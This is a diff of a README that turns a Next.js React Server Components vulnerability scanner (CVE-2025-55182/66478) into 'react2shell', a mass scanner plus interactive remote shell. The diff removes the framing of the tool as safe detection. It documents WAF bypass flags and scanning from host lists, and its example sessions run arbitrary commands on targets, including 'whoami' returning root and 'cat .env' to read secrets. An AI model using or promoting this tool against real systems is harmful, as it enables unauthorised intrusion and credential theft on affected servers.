@@ -1,96 +1,47 @@
-# react2shell-scanner
+# react2shell
 
-A command-line tool for detecting CVE-2025-55182 and CVE-2025-66478 in Next.js applications using React Server Components.
-
-For technical details on the vulnerability and detection methodology, see our blog post: https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478
+Scanner and interactive RCE shell for CVE-2025-55182 / CVE-2025-66478 in Next.js React Server Components.
 
 ## How It Works
 
-By default, the scanner sends a crafted multipart POST request containing an RCE proof-of-concept payload that executes a deterministic math operation (`41*271 = 11111`). Vulnerable hosts return the result in the `X-Action-Redirect` response header as `/login?a=11111`.
+Both tools send crafted multipart POST requests containing an RCE payload that executes commands via Node.js `child_process.execSync`. The command output is reflected in the `X-Action-Redirect` response header.
 
-The scanner tests the root path (`/`) by default. Use `--path` or `--path-file` to test custom paths. If not vulnerable, it follows same-host redirects (e.g., `/` to `/en/`) and tests the redirect destination. Cross-origin redirects are not followed.
-
-### Safe Check Mode
-
-The `--safe-check` flag uses an alternative detection method that relies on side-channel indicators (500 status code with specific error digest) without executing code on the target. Use this mode when RCE execution is not desired.
-
-### WAF Bypass
-
-The `--waf-bypass` flag prepends random junk data to the multipart request body. This can help evade WAF content inspection that only analyzes the first portion of request bodies. The default size is 128KB, configurable via `--waf-bypass-size`. When WAF bypass is enabled, the timeout is automatically increased to 20 seconds (unless explicitly set).
-
-### Vercel WAF Bypass
-
-The `--vercel-waf-bypass` flag uses an alternative payload variant specifically designed to bypass Vercel WAF protections. This uses a different multipart structure with an additional form field.
-
-### Windows Mode
-
-The `--windows` flag switches the payload from Unix shell (`echo $((41*271))`) to PowerShell (`powershell -c "41*271"`) for targets running on Windows.
+The **scanner** runs a deterministic check (`41*271 = 11111`) across many hosts. The **interactive shell** lets you run arbitrary commands on a single target.
 
 ## Requirements
 
 - Python 3.9+
-- requests
-- tqdm
+- [uv](https://docs.astral.sh/uv/) (recommended) or pip
 
 ## Installation
 
+### uv (recommended)
+
+```sh
+uv tool install https://github.com/ogpourya/react2shell.git
 ```
+
+This installs two commands:
+- `react2shell` — scanner
+- `react2shell-interactive` — interactive shell
+
+### pip
+
+```sh
 pip install -r requirements.txt
 ```
 
-## Usage
+## Scanner
 
-Scan a single host:
+Scan targets for the RCE vulnerability:
 
-```
-python3 scanner.py -u https://example.com
-```
-
-Scan a list of hosts:
-
-```
-python3 scanner.py -l hosts.txt
+```sh
+react2shell -u https://example.com
+react2shell -l hosts.txt
+react2shell -l hosts.txt -t 20 -o results.json
 ```
 
-Scan with multiple threads and save results:
-
-```
-python3 scanner.py -l hosts.txt -t 20 -o results.json
-```
-
-Scan with custom headers:
-
-```
-python3 scanner.py -u https://example.com -H "Authorization: Bearer token" -H "Cookie: session=abc"
-```
-
-Use safe side-channel detection:
-
-```
-python3 scanner.py -u https://example.com --safe-check
-```
-
-Scan Windows targets:
-
-```
-python3 scanner.py -u https://example.com --windows
-```
-
-Scan with WAF bypass:
-
-```
-python3 scanner.py -u https://example.com --waf-bypass
-```
-
-Scan custom paths:
-
-```
-python3 scanner.py -u https://example.com --path /_next
-python3 scanner.py -u https://example.com --path /_next --path /api
-python3 scanner.py -u https://example.com --path-file paths.txt
-```
-
-## Options
+### Scanner options
 
 ```
 -u, --url         Single URL to check
@@ -98,30 +49,87 @@ python3 scanner.py -u https://example.com --path-file paths.txt
 -t, --threads     Number of concurrent threads (default: 10)
 --timeout         Request timeout in seconds (default: 10)
 -o, --output      Output file for results (JSON)
---all-results     Save all results, not just vulnerable hosts
--k, --insecure    Disable SSL certificate verification
+--all-results     Save all results, not just vulnerable
+-k, --insecure    Disable SSL verification
 -H, --header      Custom header (can be used multiple times)
--v, --verbose     Show response details for vulnerable hosts
--q, --quiet       Only output vulnerable hosts
+-v, --verbose     Show response details
+-q, --quiet       Only show vulnerable hosts
 --no-color        Disable colored output
---safe-check      Use safe side-channel detection instead of RCE PoC
---windows         Use Windows PowerShell payload instead of Unix shell
---waf-bypass      Add junk data to bypass WAF content inspection
+--safe-check      Safe side-channel detection (no RCE)
+--windows         Windows PowerShell payload
+--waf-bypass      Add junk data to bypass WAF inspection
 --waf-bypass-size Size of junk data in KB (default: 128)
---path            Custom path to test (can be used multiple times)
---path-file       File containing paths to test (one per line)
+--path            Custom path to test
+--path-file       File containing paths to test
 ```
+
+## Interactive Shell
+
+A prompt_toolkit-based interactive shell for executing commands on a vulnerable target.
+
+```sh
+react2shell-interactive https://example.com
+```
+
+Or without arguments (prompts for URL):
+
+```sh
+react2shell-interactive
+```
+
+Once connected, it works like a normal shell:
+
+```
+ example.com ~ % whoami
+  [16:44:30] exec `whoami`
+  root
+  [16:44:30] ok (1 attempt)
+ example.com ~ % cd /tmp
+ example.com /tmp % ls -la
+```
+
+### Commands
+
+| Input | Action |
+|---|---|
+| `url <URL>` | Set target URL (probes vulnerability) |
+| `cd <path>` | Change remote working directory |
+| `<command>` | Execute on target (bare words work) |
+| `!<command>` | Also executes on target |
+| `retry` | Retry last command |
+| `info` | Show session info |
+| `history` | Show command history |
+| `set <key> <value>` | Set option (timeout, verify, windows) |
+| `clear` | Clear screen |
+| `help` | Show help |
+| `exit` / `quit` | Exit |
+| `Ctrl+C` | Cancel current line |
+| `Ctrl+D` | Exit shell |
+
+### Session persistence
+
+State (URL, working directory, timeout, mode) is saved to `.interactive_state` and restored on restart. The target is re-probed on restore — if no longer vulnerable, the session is discarded.
+
+### Examples
+
+```
+ example.com ~ % whoami
+ example.com ~ % id
+ example.com ~ % cd /var/www
+ example.com /var/www % ls
+ example.com /var/www % cat .env
+ example.com /var/www % cd /tmp
+ example.com /tmp % uname -a
+```
+
+### Retry
+
+Failed commands auto-retry up to 5 times with exponential backoff (2s, 4s, 6s, 8s, 10s). Use `retry` to retry the last command manually.
 
 ## Credits
 
-The RCE PoC was originally disclosed by [@maple3142](https://x.com/maple3142) -- we are incredibly grateful for their work in publishing a working PoC.
+RCE PoC originally disclosed by [@maple3142](https://x.com/maple3142).
 
-This tooling originally was built out as a safe way to detect the RCE. This functionality is still available via `--safe-check`, the "safe detection" mode.
-
-- Assetnote Security Research Team - [Adam Kues, Tomais Williamson, Dylan Pindur, Patrik Grobshäuser, Shubham Shah](https://x.com/assetnote)
-- [xEHLE_](https://x.com/xEHLE_) - RCE output reflection in resp header
+- Assetnote Security Research Team — [Adam Kues, Tomais Williamson, Dylan Pindur, Patrik Grobshäuser, Shubham Shah](https://x.com/assetnote)
+- [xEHLE_](https://x.com/xEHLE_) — RCE output reflection in response header
 - [Nagli](https://x.com/galnagli)
-
-## Output
-
-Results are printed to the terminal. When using `-o`, vulnerable hosts are saved to a JSON file containing the full HTTP request and response for verification.
